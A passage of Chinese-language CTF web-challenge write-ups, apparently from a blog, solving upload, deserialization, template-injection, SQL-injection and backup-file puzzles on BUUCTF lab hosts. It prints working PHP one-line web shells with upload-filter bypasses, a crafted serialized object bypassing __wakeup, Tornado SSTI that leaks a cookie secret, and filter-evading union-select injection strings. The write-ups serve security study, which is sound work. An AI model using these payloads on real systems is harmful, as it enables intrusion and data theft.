num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\0d35e2e16f0244b3bb1bab2d84d73212.png\"/></p> </li><li> <p><strong>方法二：http走私攻击</strong><br/> 构造：<code>/flagg</code>——<code>chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)</code><br/> payload：<code>/calc.php?num=file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\7262ebf7d2ec462b9114449fb9750e2e.png\"/></p> </li></ul>\n<h1><a id=\"_2019Upload_512\"></a>[极客大挑战 2019]Upload</h1>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c92eb0f8fc4443b4a172a140b71bac15.png\"/><br/> 创建一个木马文件，以便后续用蚁剑链接<br/> 文件内容为</p>\n<pre><code>GIF89a\n&lt;script language=\"php\"&gt;eval($_POST['a']);&lt;/script&gt; \n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c9a21f32e18c4cf69338a949d5397942.png\"/>可绕过的后缀名检测：<code>php,php3,php4,php5,phtml.pht</code></p>\n<p>上传此文件，然后提示<code>Not image!</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\70bcb88198a9439e8b45d817a7ba1324.png\"/></p>\n<p>用burpsuite抓包，根据提示，修改<code>Content-Type</code>的内容为 <code>image/jpeg</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\39a394f9fa52438ebc022c086f08f8c0.png\"/></p>\n<p>URL地址为：<code>/upload/a.phtml</code><br/> 连接密码为：<code>a</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\43f1dd5f806d4d40aea2a048d87056a1.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\b0f11a1c724d4ab8bb4e2727584e0106.png\"/><br/> 找到flag文件<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e79959c78b424a598c13a31682d180e5.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\17f14af3f7744873bb452a28ed9a2a80.png\"/><br/> 拿到flag~~</p>\n<h1><a id=\"_2019PHP_538\"></a>[极客大挑战 2019]PHP</h1>\n<p><a href=\"https://blog.csdn.net/m0_52923241/article/details/119334169\">具体知识点点这里</a><br/> <strong>题目类型：序列化与反序列化</strong></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\9862e1ca87ba4ba9b9afd0101f92ec6a.png\"/><br/> 这儿提示备份网站，用<a href=\"https://www.cnblogs.com/wuhongbin/p/14048052.html\">dirsearch</a>扫一下后台目录<br/> 输入：<code>python dirsearch.py -u http://9b76aef7-3183-4da4-a909-0f95ad5b6607.node4.buuoj.cn -e php</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\8b70f7b43a564e03bd0ffe43cdd20d33.png\"/><br/> 找到www.zip，访问一下<img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\5bb7833a01f64a36b7fd905609a12acf.png\"/><br/> 跳出弹窗，点击下载</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\da2c917bd6584a88b8005e376fa24663.png\"/><br/> 发现有flag.php目录<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\360f0b284d2045bfbf50b239a8dde7b5.png\"/></p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token variable\">$flag</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'Syc{dog_dog_dog_dog}'</span><span class=\"token punctuation\">;</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>无用信息<br/> 查看index.php源码，<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\18e53652c8c745e792c51904f84c988d.png\"/><br/> 发现包含class.php文件，采用get传参select，还有个php反序列化函数unserialize()</p>\n<p>查看另一个文件class.php<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\8260fabcba434f14852f31b9b8b12b6c.png\"/><br/> 查看源码<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\7de5123510ea4a83a162ef5eb73df487.png\"/></p>\n<p>发现有输出flag的条件，接下来代码审计</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include</span> <span class=\"token string single-quoted-string\">'flag.php'</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">error_reporting</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'yesyes'</span><span class=\"token punctuation\">;</span>\n\t<span class=\"token comment\">//创建对象时触发</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">//使用unserialize时触发</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'guest'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\t<span class=\"token comment\">//对象被销毁时触发</span>\n\t<span class=\"token comment\">//如果password=100，username=admin，在执行__destruct()的时候可以获得flag</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">!=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You name is: \"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"You password is: \"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span><span class=\"token punctuation\">;</span><span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br&gt;\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">===</span> <span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">global</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">{<!-- --></span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can't give you the flag!\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>       \n        <span class=\"token punctuation\">}</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre>\n<p>通过反序列化来执行destruct函数，如果password=100，username=admin，可以获得flag</p>\n<p>构造序列化</p>\n<pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'yesyes'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n\n</code></pre>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a7971ddc43314fb1991bc24fe866962f.png\"/></p>\n<p>接着执行反序列化，执行之前限制性wakeup函数，但是__wakeup函数会修改username的值，所以一个想办法绕过wakeup<br/> <strong>绕过方法：当成员属性数目大于实际数目时可绕过wakeup方法(CVE-2016-7124)</strong></p>\n<ul><li> <p><strong>方法一：用序列化加%00</strong><br/> <strong>private</strong>：属性被序列化的时候属性名会变成<code>%00类名%00属性名</code>，长度跟随属性名长度而改变。<strong>加%00的目的就是用于替代\\0</strong></p> <pre><code class=\"prism language-php\"><span class=\"token argument-name\">O</span><span class=\"token punctuation\">:</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"Name\"</span><span class=\"token punctuation\">:</span><span class=\"token number\">3</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">{<!-- --></span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"%00Name%00username\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">5</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"admin\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">s</span><span class=\"token punctuation\">:</span><span class=\"token number\">14</span><span class=\"token punctuation\">:</span><span class=\"token string double-quoted-string\">\"%00Name%00password\"</span><span class=\"token punctuation\">;</span><span class=\"token argument-name\">i</span><span class=\"token punctuation\">:</span><span class=\"token number\">100</span><span class=\"token punctuation\">;</span><span class=\"token punctuation\">}</span>\n\n</code></pre> <p>构造payload：<code>/?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\73cac5fc6ba84c0ea13c5fad78a22b21.png\"/></p> </li><li> <p><strong>方法二：直接url编码</strong></p> <pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n\n<span class=\"token keyword\">class</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$username</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'nonono'</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">private</span> <span class=\"token variable\">$password</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'yesyes'</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">username</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$username</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-&gt;</span><span class=\"token property\">password</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Name</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'admin'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token function\">var_dump</span><span class=\"token punctuation\">(</span><span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//进行url编码，防止%00对应的不可打印字符在复制时丢失</span>\n<span class=\"token operator\">?</span><span class=\"token operator\">&gt;</span>\n</code></pre> <p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\d5af9c76767a4672825ae8fad0c640b2.png\"/></p> </li></ul>\n<h1><a id=\"_2018easy_tornado_665\"></a>[护网杯 2018]easy_tornado</h1>\n<p>首先出来三个链接<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\25ad9d2849d44657b038d8010cfe69b5.png\"/>查看flag.txt<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\df923eedf933449eaece4a3384515929.png\"/>提示flag在/fllllllllllllag中<br/> OK，知道了第一个条件，filename=/fllllllllllllag<br/> 查看welcome.txt<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\a3dc1402cc5c4ea4896a238804d2632f.png\"/>查看hints.txt<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\20fae3fba0e2460cb5d3d1eb3e737ead.png\"/><br/> 分析一下<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e8e12948eeab44e0ad58b08f793bc28b.png\"/><br/> 这里有两个参数，第一个参数filename，文件的名称，我们通过查看flag.txt文件知道，藏flag的文件名为fllllllllllllag；第二个参数filehash，翻译一下：文件哈希，也就是加密了</p>\n<p>加密方法在第三个文件中<code>md5(cookie_secret+md5(filename))</code>，将cookie_secret+filename的值md5加密后的值，整体再md5加密；然后把最后的值赋给filehash</p>\n<p>现在最重要的一步就是获取cookie_secret的值，这个我不会。看一下大佬们怎么做</p>\n<p>在试的过程中，尝试只输入filename的值而忽略filehash，结果出来以下内容，URL变成<code>/error?msg=Error</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ce4f0d7f779b4cdcab5390cf70a385a8.png\"/>我们前面忽视了第二个文件内容<code>render</code>。我以为只是个没用的信息，结果一查，还是个挺重要的东西，怪我见得太少</p>\n<blockquote>\n<p><strong>render</strong>是python中的一个<strong>渲染函数</strong>，也就是一种<strong>模板</strong>，通过调用的参数不同，生成不同的网页 ，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{<!-- -->{}}进行传递变量和执行简单的表达式。<br/> <strong>Tornado</strong>是一种 Web 服务器软件的开源版本。Tornado 和现在的主流 Web 服务器框架（包括大多数 Python 的框架）有着明显的区别：它是非阻塞式服务器，而且速度相当快。</p>\n</blockquote>\n<p>以上是我的分析过程，下面看一下大佬的解法</p>\n<p>由于是python的一个模板，首先想到的就是<strong>模板注入</strong>{<!-- -->{}}，最终找到的位置是报错网页（随便访问一个文件是更改它的签名就可以进入），里面的参数msg。<br/> render是模板注入，经过测试发现过滤了。构造payload:<code>/error?msg={<!-- -->{1*2}}</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\5c2b0d3b191a4a02912a47163b895cbb.png\"/></p>\n<blockquote>\n<p>在tornado模板中，存在一些可以访问的快速对象,这里用到的是handler.settings，handler指向RequestHandler，而RequestHandler.settings又指向self.application.settings，所以handler.settings就指向RequestHandler.application.settings了，这里面就是我们的一些环境变量</p>\n</blockquote>\n<p>构造payload<code>/error?msg={<!-- -->{handler.settings}}</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\f3ae2f5a929f41ddbf73b1ca8220b679.png\"/><br/> 找到cookie_secret为<code>6e6e371d-7445-46db-8066-46e0e25c8b7a</code></p>\n<p>filename的值md5加密后为<code>3bf9f6cf685a6dd8defadabfb41a03a1</code><br/> cookie_secret+filename加密后的值为<code>9ff081746c35f525a315a313ac1a00d8</code><br/> 构造payload：<code>/file?filename=/fllllllllllllag&amp;filehash=9ff081746c35f525a315a313ac1a00d8</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\ce4ec6423342408db279e5fca8065ddc.png\"/></p>\n<h1><a id=\"ACTF2020_Upload_711\"></a>[ACTF2020 新生赛]Upload</h1>\n<p><strong>题目类型：文件上传，一句话木马</strong><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\fe9e2bbe95a343e8a26dc36856e5623e.png\"/><br/> 上传一句话木马<code>&lt;?php eval($_POST[a]);?&gt;</code>，修改后缀名为<code>.jpg</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\d4fe51c92e754f4d80bd9055b85def4a.png\"/></p>\n<p>burpsuite抓包，修改后缀名<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\4278380cf2dc4b3ea53983eb5686c48b.png\"/><br/> 知道修改为<code>.phtml</code>后显示上传成功<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\f66768bfc9b9421eae64d55aaff0249e.png\"/></p>\n<p>使用蚁剑连接，URL地址为：<code>http://848a2803-bdd9-4890-be0e-526c8ce1433f.node4.buuoj.cn:81/./uplo4d/71056c0c9cb12f2b7d720156da9eabf1.phtml</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\08a9e92fae4a451ea442066c9b4ffac1.png\"/></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\b07d635211b8439fbe45e181517bcb74.png\"/><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\5a5b27f0f2a64c2d8353896c4ce0f1c1.png\"/><br/> 拿到flag~~</p>\n<h1><a id=\"_2019BabySQL_729\"></a>[极客大挑战 2019]BabySQL</h1>\n<p><strong>题目类型：SQL注入</strong><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\fe5a463c37cb4138b076bb8f3851e83d.png\"/></p>\n<p>输入用户名为<code>admin</code>，密码为<code>1'</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\b99ce5efe41f433eb114435fffe95bd2.png\"/><br/> 由报错信息可知存在SQL注入漏洞<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\190d3427381d45c4aa513cbe6a2bdd8e.png\"/><br/> 先试一下常规注入：<code>/check.php?username=admin&amp;password=1' union select 1#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\df8ab571e4e04ba28de2c61281ea3691.png\"/><br/> 根据报错信息猜测union 、select可能被过滤了，试一下双写绕过<br/> <code>/check.php?username=admin&amp;password=1' ununionion seselectlect 1#</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\9ceabf25fd25408082d2ea59e9456d75.png\"/><br/> 继续报错，URL编码试一下，然后试列数<br/> payload：<code>/check.php?username=admin&amp;password=1' ununionion seselectlect 1,2,3%23</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\519ae9edb3db41fca7c3662558707a60.png\"/></p>\n<p>出现回显位置2和3</p>\n<p>爆数据库:<code>/check.php?username=admin&amp;password=1' ununionion seselectlect 1,2,group_concat(schema_name)frfromom(infoorrmation_schema.schemata) %23</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c67e6e5be4d04c329e0c76bb73c28a29.png\"/><br/> 猜测flag在ctf里<br/> 爆表：<code>/check.php?username=admin&amp;password=1' ununionion seselectlect 1,2, group_concat(table_name)frfromom(infoorrmation_schema.tables) whwhereere table_schema=\"ctf\" %23</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\dfdd98b6aff940d5989812992d30ff2e.png\"/><br/> 查字段名：<code>/check.php?username=admin&amp;password=pwd ' ununionion seselectlect 1,2,group_concat(column_name) frfromom (infoorrmation_schema.columns) whwhereere table_name=\"Flag\"%23</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\cb341fbe9c3a4cbbb52793a9d38fbb7e.png\"/><br/> <code>/check.php?username=admin&amp;password=pwd ' ununionion seselectlect 1,2,group_concat(flag) frfromom(ctf.Flag)%23</code></p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\2203d64738274ef5802622b4f58266f9.png\"/></p>\n<h1><a id=\"ACTF2020_BackupFile_761\"></a>[ACTF2020 新生赛]BackupFile</h1>\n<p><strong>题目类型：备份文件</strong></p>\n<ul><li> <p><strong>知识点</strong></p>\n<ul><li><code>==</code>是不判断二者是否是同一数据类型，而<code>===</code>是更为严格的比较，它不仅要求二者值相等，而且还要求它们的数据类型也相同。</li><li>常见的备份文件后缀：<code>.rar .zip .7z .tar .gz .bak .swp .txt .html</code></li><li><code>is_numeric</code>函数用于检测变量是否为数字或数字字符串</li><li><code>intval()</code> 函数用于获取变量的整数值</li><li>数字 加 字母等非数字转换 \n    <blockquote>\n<p>var s = ‘234string’;<br/> parseInt(s);　//234<br/> parseFloat(s); //234.0</p>\n</blockquote> </li></ul> </li><li> <p><strong>解题步骤</strong><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\33f90eff50044033b80fee2ea773be7b.png\"/></p> <p>用dirsearch扫一下目录：<code>python dirsearch.py -u 3943f78f-4c3d-4d7c-8728-9f59f4527095.node4.buuoj.cn:81 -e php</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\33e58f77c1c14c6899b84c09ee7586b2.png\"/><br/> 访问index.php.bak<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\77bf3a9509db4e68ab62e1204faaf49b.png\"/><br/> 出现PHP代码</p> <pre><code class=\"prism language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">include_once</span> <span class=\"token string double-quoted-string\">\"flag.php\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'key'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token comment\">//is_numeric函数用于检测变量是否为数字或数字字符串</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">exit</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"Just num!\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token comment\">//intval() 函数用于获取变量的整数值</span>\n    <span class=\"token variable\">$key</span> <span class=\"token operator\">=</span> <span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$str</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$key</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$str</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{<!-- --></span>\n        <span class=\"token keyword\">echo</span> <span class=\"token variable\">$flag</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">else</span> <span class=\"token punctuation\">{<!-- --></span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"Try to find out source file!\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n\n</code></pre> <p>代码审计：通过key变量get传参，要求此变量必须是数字，且取整数之后值为123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3<br/> 取key的值为123 <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\6c27c240688b42bea1a20b17ee832614.png\"/></p> </li></ul>\n<h1><a id=\"HCTF_2018admin_807\"></a>[HCTF 2018]admin</h1>\n<p><a href=\"https://blog.csdn.net/m0_52923241/article/details/119577219?spm=1001.2014.3001.5501\">更多知识点及解题方法点这里</a><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e3541d2cd8a94a2f86591f54514347cf.png\"/>这里有两个选项，点击register注册一个新账户<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\36e02c4d81494ad39c0aee964321bd58.png\"/></p>\n<p>下面这就算是登进来了<br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\8942320010ad45f7a5cba578f354e04c.png\"/><br/> 查看源码</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\11144b25a7c54fee8be5afec88eb1dc1.png\"/><br/> 提示you are not admin，可能需要登录admin才能获取我们想要的东西</p>\n<p>试一下弱口令，用户名<code>admin</code>,密码<code>123</code><br/> <img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\c2f0d504c56b4e3a8fe04ad3ce3218ee.png\"/>结果就这么成功登进来了，所以这里警示我们密码复杂点</p>\n<p>好，上面是插叙，下面才是正常解法</p>\n<p><img alt=\"在这里插入图片描述\" src=\"..\\..\\static\\image\\e0c4fbe60bea4e759d9fdaeebaf3e7ed.png\"/><br/> 登录后有四个选项<br/> 点击post</p>\n<p><img 